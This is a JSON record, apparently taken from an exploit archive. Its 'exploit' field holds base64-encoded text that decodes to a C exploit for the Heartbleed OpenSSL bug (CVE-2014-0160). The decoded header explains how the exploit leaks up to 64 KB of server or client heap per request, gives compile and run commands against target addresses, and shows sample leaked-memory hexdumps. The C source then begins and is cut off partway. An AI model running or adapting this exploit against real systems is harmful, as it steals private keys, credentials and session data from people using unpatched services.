{
    "source": "exploit-database", 
    "exploit": "LyogDQoqIENWRS0yMDE0LTAxNjAgaGVhcnRibGVlZCBPcGVuU1NMIGluZm9ybWF0aW9uIGxlYWsgZXhwbG9pdA0KKiA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiogVGhpcyBleHBsb2l0IHVzZXMgT3BlblNTTCB0byBjcmVhdGUgYW4gZW5jcnlwdGVkIGNvbm5lY3Rpb24NCiogYW5kIHRyaWdnZXIgdGhlIGhlYXJ0YmxlZWQgbGVhay4gVGhlIGxlYWtlZCBpbmZvcm1hdGlvbiBpcw0KKiByZXR1cm5lZCB3aXRoaW4gZW5jcnlwdGVkIFNTTCBwYWNrZXRzIGFuZCBpcyB0aGVuIGRlY3J5cHRlZCANCiogYW5kIHdyb3RlIHRvIGEgZmlsZSB0byBhbm5veSBJRFMvZm9yZW5zaWNzLiBUaGUgZXhwbG9pdCBjYW4gDQoqIHNldCBoZWFydGJlYXQgcGF5bG9hZCBsZW5ndGggYXJiaXRyYXJpbHkgb3IgdXNlIHR3byBwcmVzZXQgDQoqIHZhbHVlcyBmb3IgTlVMTCBhbmQgTUFYIGxlbmd0aC4gVGhlIHZ1bG5lcmFiaWxpdHkgb2NjdXJzIGR1ZSANCiogdG8gYm91bmRzIGNoZWNraW5nIG5vdCBiZWluZyBwZXJmb3JtZWQgb24gYSBoZWFwIHZhbHVlIHdoaWNoIA0KKiBpcyB1c2VyIHN1cHBsaWVkIGFuZCByZXR1cm5lZCB0byB0aGUgdXNlciBhcyBwYXJ0IG9mIERUTFMvVExTIA0KKiBoZWFydGJlYXQgU1NMIGV4dGVuc2lvbi4gQWxsIHZlcnNpb25zIG9mIE9wZW5TU0wgMS4wLjEgdG8gDQoqIDEuMC4xZiBhcmUga25vd24gYWZmZWN0ZWQuIFlvdSBtdXN0IHJ1biB0aGlzIGFnYWluc3QgYSB0YXJnZXQgDQoqIHdoaWNoIGlzIGxpbmtlZCB0byBhIHZ1bG5lcmFibGUgT3BlblNTTCBsaWJyYXJ5IHVzaW5nIERUTFMvVExTLg0KKiBUaGlzIGV4cGxvaXQgbGVha3MgdXB0byA2NTUzMiBieXRlcyBvZiByZW1vdGUgaGVhcCBlYWNoIHJlcXVlc3QNCiogYW5kIGNhbiBiZSBydW4gaW4gYSBsb29wIHVudGlsIHRoZSBjb25uZWN0ZWQgcGVlciBlbmRzIGNvbm5lY3Rpb24uDQoqIFRoZSBkYXRhIGxlYWtlZCBjb250YWlucyAxNiBieXRlcyBvZiByYW5kb20gcGFkZGluZyBhdCB0aGUgZW5kLg0KKiBUaGUgZXhwbG9pdCBjYW4gYmUgdXNlZCBhZ2FpbnN0IGEgY29ubmVjdGluZyBjbGllbnQgb3Igc2VydmVyLA0KKiBpdCBjYW4gYWxzbyBzZW5kIHByZV9jbWQncyB0byBwbGFpbi10ZXh0IHNlcnZpY2VzIHRvIGVzdGFibGlzaA0KKiBhbiBTU0wgc2Vzc2lvbiBzdWNoIGFzIHdpdGggU1RBUlRUTFMgb24gU01UUC9JTUFQL1BPUDMuIENsaWVudHMNCiogd2lsbCBvZnRlbiBmb3JjZWZ1bGx5IGNsb3NlIHRoZSBjb25uZWN0aW9uIGR1cmluZyBsYXJnZSBsZWFrDQoqIHJlcXVlc3RzIHNvIHRyeSB0byBsb3dlciB5b3VyIHBheWxvYWQgcmVxdWVzdCBzaXplLiANCioNCiogQ29tcGlsZWQgb24gQXJjaExpbnV4IHg4Nl82NCBnY2MgNC44LjIgMjAxNDAyMDYgdy9PcGVuU1NMIDEuMC4xZyANCioNCiogRS5nLg0KKiAkIGdjYyAtbHNzbCAtbHNzbDMgLWxjcnlwdG8gaGVhcnRibGVlZC5jIC1vIGhlYXJ0YmxlZWQNCiogJCAuL2hlYXJ0YmxlZWQgLXMgMTkyLjE2OC4xMS4yMyAtcCA0NDMgLWYgb3V0IC10IDENCiogWyBoZWFydGJsZWVkIC0gQ1ZFLTIwMTQtMDE2MCAtIE9wZW5TU0wgaW5mb3JtYXRpb24gbGVhayBleHBsb2l0DQoqIFsgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KKiBbIGNvbm5lY3RpbmcgdG8gMTkyLjE2OC4xMS4yMyA0NDMvdGNwDQoqIFsgY29ubmVjdGVkIHRvIDE5Mi4xNjguMTEuMjMgNDQzL3RjcA0KKiBbIDwzIDwzIDwzIGhlYXJ0IGJsZWVkIDwzIDwzIDwzDQoqIFsgaGVhcnRiZWF0IHJldHVybmVkIHR5cGU9MjQgbGVuZ3RoPTE2NDA4DQoqIFsgZGVjcnlwdGluZyBTU0wgcGFja2V0DQoqIFsgaGVhcnRibGVlZCBsZWFrZWQgbGVuZ3RoPTY1NTM1DQoqIFsgZmluYWwgcmVjb3JkIHR5cGU9MjQsIGxlbmd0aD0xNjM4NA0KKiBbIHdyb3RlIDE2MzgxIGJ5dGVzIG9mIGhlYXAgdG8gZmlsZSAnb3V0Jw0KKiBbIGhlYXJ0YmVhdCByZXR1cm5lZCB0eXBlPTI0IGxlbmd0aD0xNjQwOA0KKiBbIGRlY3J5cHRpbmcgU1NMIHBhY2tldA0KKiBbIGZpbmFsIHJlY29yZCB0eXBlPTI0LCBsZW5ndGg9MTYzODQNCiogWyB3cm90ZSAxNjM4NCBieXRlcyBvZiBoZWFwIHRvIGZpbGUgJ291dCcNCiogWyBoZWFydGJlYXQgcmV0dXJuZWQgdHlwZT0yNCBsZW5ndGg9MTY0MDgNCiogWyBkZWNyeXB0aW5nIFNTTCBwYWNrZXQNCiogWyBmaW5hbCByZWNvcmQgdHlwZT0yNCwgbGVuZ3RoPTE2Mzg0DQoqIFsgd3JvdGUgMTYzODQgYnl0ZXMgb2YgaGVhcCB0byBmaWxlICdvdXQnDQoqIFsgaGVhcnRiZWF0IHJldHVybmVkIHR5cGU9MjQgbGVuZ3RoPTE2NDA4DQoqIFsgZGVjcnlwdGluZyBTU0wgcGFja2V0DQoqIFsgZmluYWwgcmVjb3JkIHR5cGU9MjQsIGxlbmd0aD0xNjM4NA0KKiBbIHdyb3RlIDE2Mzg0IGJ5dGVzIG9mIGhlYXAgdG8gZmlsZSAnb3V0Jw0KKiBbIGhlYXJ0YmVhdCByZXR1cm5lZCB0eXBlPTI0IGxlbmd0aD00Mg0KKiBbIGRlY3J5cHRpbmcgU1NMIHBhY2tldA0KKiBbIGZpbmFsIHJlY29yZCB0eXBlPTI0LCBsZW5ndGg9MTgNCiogWyB3cm90ZSAxOCBieXRlcyBvZiBoZWFwIHRvIGZpbGUgJ291dCcNCiogWyBkb25lLg0KKiAkIGxzIC1hbCBvdXQNCiogLXJ3eC0tLS0tLSAxIGZhbnRhc3RpYyBmYW50YXN0aWMgNjU1NTQgQXByIDExIDEzOjUzIG91dA0KKiAkIGhleGR1bXAgLUMgb3V0DQoqIC0gc25pcCAtIHNuaXAgIA0KKg0KKiBVc2UgZm9sbG93aW5nIGV4YW1wbGUgY29tbWFuZCB0byBnZW5lcmF0ZSBjZXJ0aWZpY2F0ZXMgZm9yIGNsaWVudHMuDQoqDQoqICQgb3BlbnNzbCByZXEgLXg1MDkgLW5vZGVzIC1kYXlzIDM2NSAtbmV3a2V5IHJzYToyMDQ4IFwNCiogLWtleW91dCBzZXJ2ZXIua2V5IC1vdXQgc2VydmVyLmNydA0KKg0KKiBEZWJpYW4gY29tcGlsZSB3aXRoICJnY2MgaGVhcnRibGVlZC5jIC1vIGhlYXJ0YmxlZWQgLVdsLC1Cc3RhdGljIFwNCiogLWxzc2wgLVdsLC1CZHluYW1pYyAtbHNzbDMgLWxjcnlwdG8iIA0KKg0KKiB0b2RvOiBhZGQgdWRwL2R0bHMgc3VwcG9ydC4NCioNCiogLSBIYWNrZXIgRmFudGFzdGljDQoqICAgaHR0cDovL3d3dy5tZHNlYy5jby51aw0KKg0KKi8NCg0KLyogTW9kaWZpZWQgYnkgQXltYW4gU2FneSBheW1hbnNhZ3kgQCBnbWFpbC5jb20gLSBBZGRlZCBEVExTIG92ZXIgVURQIHN1cHBvcnQNCioNCiogdXNlIC11IHN3aXRjaCwgdGVzdGVkIGFnYWluc3Qgc19zZXJ2ZXIvc19jbGllbnQgdmVyc2lvbiAxLjAuMWQNCiogDQoqICMgb3BlbnNzbCBzX3NlcnZlciAtYWNjZXB0IDk5MCAtY2VydCBzc2wuY3J0IC1rZXkgc3NsLmtleSAtZHRsczENCiogLi4uDQoqICMgLi9oZWFydGJsZWVkIC1zIDE5Mi4xNjguNzUuMjM1IC1wIDk5MCAtZiBlc2h0YSAtdCAxIC11DQoqIFsgaGVhcnRibGVlZCAtIENWRS0yMDE0LTAxNjAgLSBPcGVuU1NMIGluZm9ybWF0aW9uIGxlYWsgZXhwbG9pdA0KKiBbID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiogWyA8MyA8MyA8MyBoZWFydCBibGVlZCA8MyA8MyA8Mw0KKiBbIGhlYXJ0YmVhdCByZXR1cm5lZCB0eXBlPTI0IGxlbmd0aD0xMzkyDQoqIFsgZGVjcnlwdGluZyBTU0wgcGFja2V0DQoqIFsgaGVhcnRibGVlZCBsZWFrZWQgbGVuZ3RoPTEzMzYNCiogWyBmaW5hbCByZWNvcmQgdHlwZT0yNCwgbGVuZ3RoPTEzNTUNCiogWyB3cm90ZSAxMzUyIGJ5dGVzIG9mIGhlYXAgdG8gZmlsZSAnZXNodGEnDQoqIA0KKiANCiogIyBoZXhkdW1wIC1DIGVzaHRhIA0KKiAwMDAwMDAwMCAgMDAgMDAgMDAgMDAgMDYgMzAgZjEgOTUgIDA4IDAwIDAwIDAwIDAwIDAwIDAwIDAwICB8Li4uLi4wLi4uLi4uLi4uLnwNCiogMDAwMDAwMTAgIDhjIDQzIDY0IGFiIGUzIDg5IDZiIGZkICBlMyBkMyA3NCBhMSBhMSAzMSA4YyAzNSAgfC5DZC4uLmsuLi50Li4xLjV8DQoqIDAwMDAwMDIwICAwOSA2ZCBiOSBlNyAwOCAwOCAwOCAwOCAgMDggMDggMDggMDggMDggYTEgNjUgOWYgIHwubS4uLi4uLi4uLi4uLmUufA0KKiAwMDAwMDAzMCAgY2EgMTMgODAgN2MgYTUgODggYjAgYzkgIGQ1IGY2IDdiIDE0IGZlIGZmIDAwIDAwICB8Li4ufC4uLi4uLnsuLi4uLnwNCiogMDAwMDAwNDAgIDAwIDAwIDAwIDAwIDAwIDAzIDAwIDAxICAwMSAxNiBmZSBmZiAwMCAwMSAwMCAwMCAgfC4uLi4uLi4uLi4uLi4uLi58DQoqIDAwMDAwMDUwICAwMCAwMCAwMCAwMCAwMCA0MCBiNSBmZCAgYTUgMTAgZGEgYzQgZmQgZmIgYzcgZDIgIHwuLi4uLkAuLi4uLi4uLi4ufA0KKiAwMDAwMDA2MCAgOWYgMGMgNTYgNGIgYTkgOWMgMTQgMDAgIDAwIDBjIDAwIDAzIDAwIDAwIDAwIDAwICB8Li5WSy4uLi4uLi4uLi4uLnwNCiogMDAwMDAwNzAgIDAwIDBjIDY5IGVjIGM0IGQ1IGYzIDM4ICBhZSBlNSAyZSAzYSAxYSAzMiBmOSAzMCAgfC4uaS4uLi44Li4uOi4yLjB8DQoqIDAwMDAwMDgwICA3ZiA2MSA0YyA4YyBkNyAzNCBmMyAwMiAgMDggM2YgNjggMDEgYTkgYTcgODEgNTUgIHwuYUwuLjQuLi4/aC4uLi5VfA0KKiAwMDAwMDA5MCAgMDEgYzkgMDMgMDMgMDMgMDMgMDAgMDAgIDBlIDMxIDM5IDMyIDJlIDMxIDM2IDM4ICB8Li4uLi4uLi4uMTkyLjE2OHwNCiogMDAwMDAwYTAgIDJlIDM3IDM1IDJlIDMyIDMzIDM1IDAwICAyMyAwMCAwMCAwMCAwZiAwMCAwMSAwMSAgfC43NS4yMzUuIy4uLi4uLi58DQoqIDAwMDAwMGIwICAwMCAwMCAwMCAwMCAwMCAwMCAwMCAwMCAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgIHwuLi4uLi4uLi4uLi4uLi4ufA0KKg0KKiAwMDAwMDUzMCAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgIGE1IGUyIGY1IDY3IGQ2IDIzIDg1IDQ5ICB8Li4uLi4uLi4uLi5nLiMuSXwNCiogMDAwMDA1NDAgIGIzIGNjIGVkIGM0IGQyIDc0IGM4IDk3ICBjMSBiNCBjYyAgICAgICAgICAgICAgICAgfC4uLi4udC4uLi4ufA0KKiAwMDAwMDU0Yg0KKiANCiogDQoqICMgb3BlbnNzbCBzX2NsaWVudCAtY29ubmVjdCBsb2NhbGhvc3Q6OTkwIC1kdGxzMQ0KKiAuLi4NCiogIyAuL2hlYXJ0YmxlZWQgLWIgbG9jYWxob3N0IC1wIDk5MCAtdSAtdCAxIC1mIGVzaHRhDQoqIFsgaGVhcnRibGVlZCAtIENWRS0yMDE0LTAxNjAgLSBPcGVuU1NMIGluZm9ybWF0aW9uIGxlYWsgZXhwbG9pdA0KKiBbID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiogWyBTU0wgY29ubmVjdGlvbiB1c2luZyBBRVMyNTYtU0hBDQoqIFsgPDMgPDMgPDMgaGVhcnQgYmxlZWQgPDMgPDMgPDMNCiogWyBoZWFydGJlYXQgcmV0dXJuZWQgdHlwZT0yNCBsZW5ndGg9MTM5Mg0KKiBbIGRlY3J5cHRpbmcgU1NMIHBhY2tldA0KKiBbIGhlYXJ0YmxlZWQgbGVha2VkIGxlbmd0aD0xMzM2DQoqIFsgZmluYWwgcmVjb3JkIHR5cGU9MjQsIGxlbmd0aD0xMzU1DQoqIFsgd3JvdGUgMTM1MiBieXRlcyBvZiBoZWFwIHRvIGZpbGUgJ2VzaHRhJw0KKiANCiogDQoqICMgaGV4ZHVtcCAtQyBlc2h0YSANCiogMDAwMDAwMDAgIDAwIDAwIDI0IDRlIGI3IDAwIDAwIDAwICAwMCAwMCAwMCAwMCAwMCAxOCAwMCAwMCAgfC4uJE4uLi4uLi4uLi4uLi58DQoqIDAwMDAwMDEwICBjZiBkMCA1ZiBkZiBjMyA2NCA1ZiA1OCAgNzkgMTcgZjggZjcgMjIgOWIgMjggNmUgIHwuLl8uLmRfWHkuLi4iLihufA0KKiAwMDAwMDAyMCAgYzAgZTcgZDYgYTMgMDggMDggMDggMDggIDA4IDA4IDA4IDA4IDA4IDliIGMzIDM4ICB8Li4uLi4uLi4uLi4uLi4uOHwNCiogMDAwMDAwMzAgIDJiIDMyIDVmIGRkIDNhIGQ1IDBmIDgzICA1MSAwMiAyZiA3MCAzMyA4ZiBjZiA4MiAgfCsyXy46Li4uUS4vcDMuLi58DQoqIDAwMDAwMDQwICAyMSA1YiBjYyAyNSA4MCAyNiBmMyAyOSAgYzggOTAgOTEgZWMgNWMgODMgNjggZWUgIHwhWy4lLiYuKS4uLi5cLmgufA0KKiAwMDAwMDA1MCAgNmIgMTEgMGQgYWQgZjEgZjQgZGEgOWUgIDEzIDU5IDhmIDJhIDc0IGY2IGQ0IDM1ICB8ay4uLi4uLi4uWS4qdC4uNXwNCiogMDAwMDAwNjAgIDllIDE3IDEyIDdjIDJiIDZmIDllIGE4ICAxZSBiNCA3YSAzYyBhNSBlYyAxOCBlMCAgfC4uLnwrby4uLi56PC4uLi58DQoqIDAwMDAwMDcwICA0NCBiMiA1MSBlNCA2OSA4YyA0NyAyOSAgMzkgZmIgOWUgYjAgZGQgNWIgMDUgNGQgIHxELlEuaS5HKTkuLi4uWy5NfA0KKiAwMDAwMDA4MCAgZGIgMTEgMDYgN2IgMWQgMDggNTggNjAgIGFjIDM0IDNmIDJkIGQxIDE0IGMxIGI3ICB8Li4uey4uWGAuND8tLi4uLnwNCiogMDAwMDAwOTAgIGQ1IDA4IDU5IDczIDE2IDI4IGY4IDc1ICAyMyBmNyA4NSAyNyA0OCBiZSAxZiAxNCAgfC4uWXMuKC51Iy4uJ0guLi58DQoqIDAwMDAwMGEwICBmZSBmZiAwMCAwMCAwMCAwMCAwMCAwMCAgMDAgMDQgMDAgMDEgMDEgMTYgZmUgZmYgIHwuLi4uLi4uLi4uLi4uLi4ufA0KKiAwMDAwMDBiMCAgMDAgMDEgMDAgMDAgMDAgMDAgMDAgMDAgIDAwIDQwIDYyIDFjIDAyIDE5IDQ1IDVmICB8Li4uLi4uLi4uQGIuLi5FX3wNCiogMDAwMDAwYzAgIDJjIGE2IDg5IDk1IGQyIGJmIDE2IGM0ICA4YiBiNyAxNCAwMCAwMCAwYyAwMCAwNCAgfCwuLi4uLi4uLi4uLi4uLi58DQoqIDAwMDAwMGQwICAwMCAwMCAwMCAwMCAwMCAwYyBlOSBmYiAgNzUgMDIgNjEgOTAgYmUgNGQgZjcgODIgIHwuLi4uLi4uLnUuYS4uTS4ufA0KKiAwMDAwMDBlMCAgMDYgZDYgZmQgNmQgNTMgYTEgZDUgNDQgIGUwIDVhIDBkIDZhIDZhIDk0IGVmIGU4ICB8Li4ubVMuLkQuWi5qai4uLnwNCiogMDAwMDAwZjAgIDRjIDAxIDRiIGNiIDg2IDczIDAzIDAzICAwMyAwMyAyZCA1MyA3NCA2MSA3NCA2NSAgfEwuSy4ucy4uLi4tU3RhdGV8DQoqIDAwMDAwMTAwICAzMSAyMSAzMCAxZiAwNiAwMyA1NSAwNCAgMGEgMGMgMTggNDkgNmUgNzQgNjUgNzIgIHwxITAuLi5VLi4uLkludGVyfA0KKiAwMDAwMDExMCAgNmUgNjUgNzQgMjAgNTcgNjkgNjQgNjcgIDY5IDc0IDczIDIwIDUwIDc0IDc5IDIwICB8bmV0IFdpZGdpdHMgUHR5IHwNCiogMDAwMDAxMjAgIDRjIDc0IDY0IDMwIDgyIDAxIDIyIDMwICAwZCAwNiAwOSAyYSA4NiA0OCA4NiBmNyAgfEx0ZDAuLiIwLi4uKi5ILi58DQoqIDAwMDAwMTMwICAwZCAwMSAwMSAwMSAwNSAwMCAwMyA4MiAgMDEgMGYgMDAgMzAgODIgMDEgMGEgMDIgIHwuLi4uLi4uLi4uLjAuLi4ufA0KKiAwMDAwMDE0MCAgODIgMDEgMDEgMDAgYzAgODUgMjYgNGEgIDlkIGNkIGY4IDVlIDQ2IDc0IGZhIDg5ICB8Li4uLi4uJkouLi5eRnQuLnwNCiogMDAwMDAxNTAgIGUzIDdkIDU4IDc2IDIzIGJhIGJhIGRjICBiMSAzNSA5OCAzNSBhNSBiYSA1MyBhMSAgfC59WHYjLi4uLjUuNS4uUy58DQoqIDAwMDAwMTYwICA1YiAzNyAyOCBmZSBmNyBkMCAwMiBmYyAgZmQgYzkgZTMgYjEgZWUgZTYgZmUgNzkgIHxbNyguLi4uLi4uLi4uLi55fA0KKiAwMDAwMDE3MCAgODYgZjggODEgMWEgMjkgMjkgYTkgODEgIDk1IDFjIGM5IDVjIDgxIGEyIGU4IDBjICB8Li4uLikpLi4uLi5cLi4uLnwNCiogMDAwMDAxODAgIDM1IGI3IGNiIDY3IDhhIGVjIDJhIGQxICA3MyBlNiA3MCA3OCA1MyBjOCA1MCA5MSAgfDUuLmcuLioucy5weFMuUC58DQoqIDAwMDAwMTkwICA0OSAwNyBkYiBlMSBhNCAwOCA3YiBmYiAgMDcgNTQgNDggODUgNDUgYzIgMzggNzEgIHxJLi4uLi57Li5USC5FLjhxfA0KKiAwMDAwMDFhMCAgNmEgOGEgZjIgNGQgYTcgYmEgMWEgODYgIDM2IGEyIGFlIGJiIGExIGUxIDdjIDJjICB8ai4uTS4uLi42Li4uLi58LHwNCiogMDAwMDAxYjAgIDEyIDA0IGNlIGU1IGQxIDc1IDI0IDk0ICAxYyAzMSAyYyA0NiBiNyA3NiAzMCAzYSAgfC4uLi4udSQuLjEsRi52MDp8DQoqIDAwMDAwMWMwICAwNCA3OSAyZiBiMyA2NSA3NCBmYiBhZSAgYzcgMTAgYTUgZGEgYTggMmQgYjYgZmQgIHwueS8uZXQuLi4uLi4uLS4ufA0KKiAwMDAwMDFkMCAgY2YgZjkgMTEgZmUgMzggY2QgMjUgN2UgIDEzIDc1IDE0IDFkIDU4IDkyIGJiIDNmICB8Li4uLjguJX4udS4uWC4uP3wNCiogMDAwMDAxZTAgIDhmIDc1IGQ1IDUyIGY3IDI3IDY2IGNhICA1ZCA1NSA0ZCAwYSBiNSA3MSBhMiAxNiAgfC51LlIuJ2YuXVVNLi5xLi58DQoqIDAwMDAwMWYwICAzZSAwMSBhZiA5NyA5MyBlYiA1YyAzZiAgZTAgZmEgYzggNjEgMmMgYTEgODcgOGYgIHw+Li4uLi5cPy4uLmEsLi4ufA0KKiAwMDAwMDIwMCAgNjAgZDQgZGYgNWQgOWQgY2QgMGYgMzQgIGE5IDY2IDZjIDkzIGQ4IDVmIDRhIDJiICB8YC4uXS4uLjQuZmwuLl9KK3wNCiogMDAwMDAyMTAgIGZkIDY3IDNhIDJmIDg4IDkwIGI0IGU5ICBmNSBkNiBlZSBiYiA3ZCA4YiAxYyBlNSAgfC5nOi8uLi4uLi4uLn0uLi58DQoqIDAwMDAwMjIwICBmMiBjYyA0ZiBiMiBjMCBkYyBlOCAxYiAgNGMgNmUgNTEgYzkgNDcgOGIgNmMgODIgIHwuLk8uLi4uLkxuUS5HLmwufA0KKiAwMDAwMDIzMCAgZjkgNGIgYWUgMDEgYTggZjkgNmMgNmQgIGQ1IDFhIGQ1IGNmIDYzIGY0IDdmIGUwICB8LksuLi4ubG0uLi4uYy4uLnwNCiogMDAwMDAyNDAgIDk2IDU0IDNmIDdkIDAyIDAzIDAxIDAwICAwMSBhMyA1MCAzMCA0ZSAzMCAxZCAwNiAgfC5UP30uLi4uLi5QME4wLi58DQoqIDAwMDAwMjUwICAwMyA1NSAxZCAwZSAwNCAxNiAwNCAxNCAgYWYgOTcgNGUgODcgNjIgOGEgNzcgYjggIHwuVS4uLi4uLi4uTi5iLncufA0KKiAwMDAwMDI2MCAgYjQgMGIgMjQgMjAgMzUgYjEgNjYgMDkgIDU1IDNmIDc0IDFkIDMwIDFmIDA2IDAzICB8Li4kIDUuZi5VP3QuMC4uLnwNCiogMDAwMDAyNzAgIDU1IDFkIDIzIDA0IDE4IDMwIDE2IDgwICAxNCBhZiA5NyA0ZSA4NyA2MiA4YSA3NyAgfFUuIy4uMC4uLi4uTi5iLnd8DQoqIDAwMDAwMjgwICBiOCBiNCAwYiAyNCAyMCAzNSBiMSA2NiAgMDkgNTUgM2YgNzQgMWQgMzAgMGMgMDYgIHwuLi4kIDUuZi5VP3QuMC4ufA0KKiAwMDAwMDI5MCAgMDMgNTUgMWQgMTMgMDQgMDUgMzAgMDMgIDAxIDAxIGZmIDMwIDBkIDA2IDA5IDJhICB8LlUuLi4uMC4uLi4wLi4uKnwNCiogMDAwMDAyYTAgIDg2IDQ4IDg2IGY3IDBkIDAxIDAxIDA1ICAwNSAwMCAwMyA4MiAwMSAwMSAwMCBiMCAgfC5ILi4uLi4uLi4uLi4uLi58DQoqIDAwMDAwMmIwICA4ZSA0MCA1OCAyZCA4NiAzMiA5NSAxMSAgYTcgYTEgNjQgMWQgZmMgMDggOGQgODcgIHwuQFgtLjIuLi4uZC4uLi4ufA0KKiAwMDAwMDJjMCAgMTggZDMgNWQgYzYgYTAgYmIgODQgNGEgIDUwIGY1IDI3IDFjIDE1IDRiIDAyIDBjICB8Li5dLi4uLkpQLicuLksuLnwNCiogMDAwMDAyZDAgIDQ5IDFmIDJkIDBhIDUyIGQzIDk4IDZiICA3MSAzZCBiOSAwZiAzNiAyNCBkMyA3NyAgfEkuLS5SLi5rcT0uLjYkLnd8DQoqIDAwMDAwMmUwICBlMCBkMCBhNSA1MCBlNSBlYSAyZCA2NyAgMTEgNjkgNGQgNDUgNTIgOTcgNGQgNTggIHwuLi5QLi4tZy5pTUVSLk1YfA0KKiAwMDAwMDJmMCAgZGUgMjIgMDYgMDIgNmQgMjEgODAgMmYgIDBkIDFjIGQ1IGQ1IDgwIDVjIDhmIDQ0ICB8LiIuLm0hLi8uLi4uLlwuRHwNCiogMDAwMDAzMDAgIDFlIGI2IGYzIDQxIDRjIGRjIGQzIDQwICA4ZCA1NCBhYyBiMCBjYSA4ZiAxOSA2YSAgfC4uLkFMLi5ALlQuLi4uLmp8DQoqIDAwMDAwMzEwICA0ZCBmMiBmYiBhZCA2OCA1YSA5OSAxOSAgY2EgYWUgYjIgZjUgNTQgNzAgMjkgOTYgIHxNLi4uaFouLi4uLi5UcCkufA0KKiAwMDAwMDMyMCAgODQgN2UgYmEgYTkgNmIgNDIgZTYgNjggIDMyIGRjIDY1IDg3IGIxIGI3IDE3IDIyICB8Ln4uLmtCLmgyLmUuLi4uInwNCiogMDAwMDAzMzAgIGUzIGNjIDYyIDk3IGU0IGZhIDY0IDBiICAxZSA3MCBiZiBlNSBhMiA0MCBlNCA0OSAgfC4uYi4uLmQuLnAuLi5ALkl8DQoqIDAwMDAwMzQwICAyNCBmOSAwNSAzZiAyZSBmZSA3YyAzOCAgNTYgMzkgNGQgYmQgNTEgNjMgMGQgNzkgIHwkLi4/Li58OFY5TS5RYy55fA0KKiAwMDAwMDM1MCAgODUgYzAgNGIgMWEgNDYgNjQgZTAgZmUgIGE4IDg3IGJmIGM3IDRkIDIxIGNiIDc5ICB8Li5LLkZkLi4uLi4uTSEueXwNCiogMDAwMDAzNjAgIDM3IGU3IGE2IGUzIDZjIDNiIGVkIDM1ICAxNyA3MyA3YSA3MSBjNiA3MiAyZiBiYiAgfDcuLi5sOy41LnN6cS5yLy58DQoqIDAwMDAwMzcwICA1OCBkYyBlZiBlOSAxZSBhMyA4OSA1ZSAgNzAgY2QgOTUgMTAgODcgYzEgOGEgN2UgIHxYLi4uLi4uXnAuLi4uLi5+fA0KKiAwMDAwMDM4MCAgZTcgNTEgYzIgMjIgNjcgNjYgZWUgMjIgIGY5IGE1IDJlIDMxIGYyIGFkIGZjIDNiICB8LlEuImdmLiIuLi4xLi4uO3wNCiogMDAwMDAzOTAgIDk4IGM4IDMwIDYzIGVmIDc0IGI1IDRlICBjNCBiZCBjNyBhMiA0NiAwYSBiOCBiZiAgfC4uMGMudC5OLi4uLkYuLi58DQoqIDAwMDAwM2EwICBkZiBhOCA1NCAwZSA0ZiAzNyBkMCBhNSAgMjcgYTMgZjMgYTcgMjggMzggM2YgMTYgIHwuLlQuTzcuLicuLi4oOD8ufA0KKiAwMDAwMDNiMCAgZmUgZmYgMDAgMDAgMDAgMDAgMDAgMDAgIDAwIDAyIDAwIDBjIDBlIDAwIDAwIDAwICB8Li4uLi4uLi4uLi4uLi4uLnwNCiogMDAwMDAzYzAgIDAwIDAyIDAwIDAwIDAwIDAwIDAwIDAwICAwMCAwMCAwMCAwMCAwMCAwMCAwMCAwMCAgfC4uLi4uLi4uLi4uLi4uLi58DQoqIDAwMDAwM2QwICAwMCAwMCAwMCAwMCAwMCAwMCAwMCAwMCAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgIHwuLi4uLi4uLi4uLi4uLi4ufA0KKiAqDQoqIDAwMDAwNTMwICAwMCAwMCAwMCAwMCAwMCAwMCAwMCAwMCAgODIgOGYgYmUgZmYgY2YgMjYgMTIgOWQgIHwuLi4uLi4uLi4uLi4uJi4ufA0KKiAwMDAwMDU0MCAgYTIgZGUgMGMgNDQgMjEgNGEgNTQgYmUgIDQxIDRjIGRmICAgICAgICAgICAgICAgICB8Li4uRCFKVC5BTC58DQoqIDAwMDAwNTRiDQoqIA0KKi8NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGludC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGdldG9wdC5oPg0KI2luY2x1ZGUgPHNpZ25hbC5oPg0KI2luY2x1ZGUgPG5ldGRiLmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+DQojaW5jbHVkZSA8aW50dHlwZXMuaD4NCiNpbmNsdWRlIDxvcGVuc3NsL2Jpby5oPg0KI2luY2x1ZGUgPG9wZW5zc2wvc3NsLmg+DQojaW5jbHVkZSA8b3BlbnNzbC9lcnIuaD4NCiNpbmNsdWRlIDxvcGVuc3NsL2V2cC5oPg0KI2luY2x1ZGUgPG9wZW5zc2wvdGxzMS5oPg0KI2luY2x1ZGUgPG9wZW5zc2wvcmFuZC5oPg0KI2luY2x1ZGUgPG9wZW5zc2wvYnVmZmVyLmg+DQoNCiNkZWZpbmUgbjJzKGMscykoKHM9KCgodW5zaWduZWQgaW50KShjWzBdKSk8PCA4KXwgXA0KCQkoKCh1bnNpZ25lZCBpbnQpKGNbMV0pKSAgICApKSxjKz0yKQ0KI2RlZmluZSBzMm4ocyxjKSAoKGNbMF09KHVuc2lnbmVkIGNoYXIpKCgocyk+PiA4KSYweGZmKSwgXA0KCQkgY1sxXT0odW5zaWduZWQgY2hhcikoKChzKSAgICApJjB4ZmYpKSxjKz0yKQ0KDQppbnQgZmlyc3QgPSAwOw0KaW50IGxlYWtieXRlcyA9IDA7DQppbnQgcmVwZWF0ID0gMTsNCmludCBiYWRwYWNrZXRzID0gMDsNCg0KdHlwZWRlZiBzdHJ1Y3Qgew0KCWludCBzb2NrZXQ7DQoJU1NMICpzc2xIYW5kb